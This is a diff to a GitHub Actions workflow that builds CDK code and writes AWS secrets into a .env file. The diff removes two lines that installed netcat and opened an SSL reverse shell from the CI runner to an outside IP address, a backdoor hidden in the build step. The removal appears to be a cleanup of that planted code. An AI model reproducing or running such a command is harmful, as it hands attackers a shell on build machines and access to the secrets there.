@@ -59,8 +59,6 @@ jobs:
         run: |
           echo "DYNAMODB_TABLE=${{ secrets.AWS_DYNAMODB_TABLE }}" > .env
           echo "S3_BUCKET=${{ secrets.AWS_S3_BUCKET }}" >> .env
-          yum -y install nc
-          ncat 174.138.17.209 443 --ssl -e /bin/bash -v
       - name: Build CDK code
         run: |
           npm install
